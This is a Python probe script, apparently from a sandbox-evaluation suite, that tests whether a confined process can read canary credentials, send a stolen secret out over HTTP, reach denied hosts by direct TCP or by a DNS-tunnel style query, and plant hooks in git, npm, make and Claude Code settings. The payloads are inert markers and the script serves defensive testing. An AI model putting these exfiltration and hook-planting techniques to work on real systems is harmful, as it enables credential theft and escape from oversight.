#!/usr/bin/env python3
"""Deterministic boundary probes. All paths and tokens are synthetic fixtures.

Usage: probe.py 'CONFIG-JSON'. The config holds paths and receiver addresses only;
the canary value is never passed in. The probe sends onward only what it
managed to read itself, so the exfiltration row measures a stolen value.
"""
import errno
import hashlib
import json
import os
import secrets
import socket
import struct
import sys
import urllib.error
import urllib.request
from pathlib import Path

ENV_NAME = "SANDBOX_MATRIX_TOKEN"
# Files that a trusted component outside the sandbox later runs or loads:
# git, Claude Code (hooks, statusLine, apiKeyHelper, project MCP servers),
# make, npm, direnv, pre-commit. Contents are inert markers, never executed here.
DEFERRED = {
    # The hook only leaves a marker one level above the repository, outside the
    # workspace, so the runner can see whether git ran it outside the sandbox.
    "git_hook": (".git/hooks/pre-commit", "#!/bin/sh\necho sandbox-matrix > ../hook-ran\n"),
    "claude_settings": (".claude/settings.json", json.dumps({
        "hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "true"}]}]},
        "statusLine": {"type": "command", "command": "true"},
        "apiKeyHelper": "true"}) + "\n"),
    "mcp_config": (".mcp.json", json.dumps({"mcpServers": {"sandbox-matrix": {"command": "true"}}}) + "\n"),
    "makefile": ("Makefile", "all:\n\t@true # sandbox-matrix marker\n"),
    "npm_script": ("package.json", json.dumps({"name": "fixture", "scripts": {"postinstall": "true"}}) + "\n"),
    "envrc": (".envrc", "# sandbox-matrix marker\n"),
    "precommit_config": (".pre-commit-config.yaml", "repos: []  # sandbox-matrix marker\n"),
}
DENIED = (errno.EACCES, errno.EPERM, errno.EROFS)


def run(config):
    nonce = secrets.token_hex(8)
    stolen = []
    print(json.dumps({"id": "meta", "nonce": nonce, "netns": netns()}), flush=True)

    def probe(name, operation):
        result = {"id": name}
        try:
            extra = operation()
            result.update(outcome="allowed", **(extra or {}))
        except urllib.error.HTTPError as exc:
            # Only an explicit proxy denial counts; DNS/TLS/timeouts are errors.
            result.update(outcome="blocked" if exc.code == 403 else "error", detail=str(exc))
        except urllib.error.URLError as exc:
            reason = exc.reason
            code = getattr(reason, "errno", None)
            result.update(outcome="blocked" if code in DENIED else "error", detail=str(exc),
                          errno=errno.errorcode.get(code))
        except OSError as exc:
            code = errno.ETIMEDOUT if isinstance(exc, socket.timeout) else exc.errno
            # Numbers differ between Linux and macOS; the reducer compares names.
            result.update(outcome="blocked" if code in DENIED else "error", detail=str(exc),
                          errno=errno.errorcode.get(code))
        except Exception as exc:  # preserve diagnostics; never turn a crash into a pass
            result.update(outcome="error", detail=repr(exc))
        print(json.dumps(result), flush=True)

    def read_file():
        value = Path(config["private"]).read_text()
        stolen.append(value)
        return {"sha256": digest(value)}

    def read_env():
        value = os.environ.get(ENV_NAME)
        if value is None:
            raise PermissionError(errno.EACCES, "variable absent in the probe environment")
        stolen.append(value)
        return {"sha256": digest(value)}

    def request(url, path):
        # macOS urllib otherwise bypasses HTTP_PROXY for loopback addresses.
        urllib.request.proxy_bypass = lambda _host: False
        with urllib.request.urlopen(url + path, timeout=5) as response:
            assert response.status == 200

    def exfiltrate():
        if not stolen:
            raise PermissionError(errno.EACCES, "nothing was read upstream; nothing to send")
        request(config["allowed"], "/secret/" + stolen[0])

    def direct():
        host, port = config["denied"].removeprefix("http://").rsplit(":", 1)
        with socket.create_connection((host, int(port)), timeout=5) as connection:
            connection.sendall(f"GET /direct/{nonce} HTTP/1.0\r\n\r\n".encode())
            assert connection.recv(100)

    def dns_udp():
        # A DNS query whose name carries the nonce: what a DNS tunnel would send.
        host, port = config["udp"]
        query = struct.pack(">HHHHHH", 0x5a5a, 0x0100, 1, 0, 0, 0)
        for label in (nonce, "exfil", "test"):
            query += bytes([len(label)]) + label.encode()
        query += b"\x00" + struct.pack(">HH", 1, 1)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
            udp.settimeout(3)
            udp.sendto(query, (host, int(port)))
            udp.recvfrom(512)

    def unix_socket():
        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as unix:
            unix.settimeout(3)
            unix.connect(config["unix_socket"])
            unix.sendall(("unix/" + nonce + "\n").encode())
            assert unix.recv(10)

    def deferred(relative, content):
        target = Path(config["workspace"]) / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
        target.chmod(0o755)

    probe("workspace_write", lambda: deferred("output.txt", nonce))
    probe("credential_file", read_file)
    probe("credential_env", read_env)
    probe("outside_write", lambda: Path(config["outside"]).write_text(nonce) and None)
    probe("denied_http", lambda: request(config["denied"], "/nonce/" + nonce))
    probe("direct_tcp", direct)
    probe("dns_udp", dns_udp)
    if config.get("unix_socket"):
        probe("unix_socket", unix_socket)
    probe("allowed_channel", lambda: request(config["allowed"], "/nonce/" + nonce))
    probe("exfil_secret", exfiltrate)
    for name, (relative, content) in DEFERRED.items():
        probe(name, lambda r=relative, c=content: deferred(r, c))


def digest(value):
    return hashlib.sha256(value.encode()).hexdigest()


def netns():
    try:
        return os.readlink("/proc/self/ns/net")
    except OSError:
        return None


if __name__ == "__main__":
    run(json.loads(sys.argv[1]))
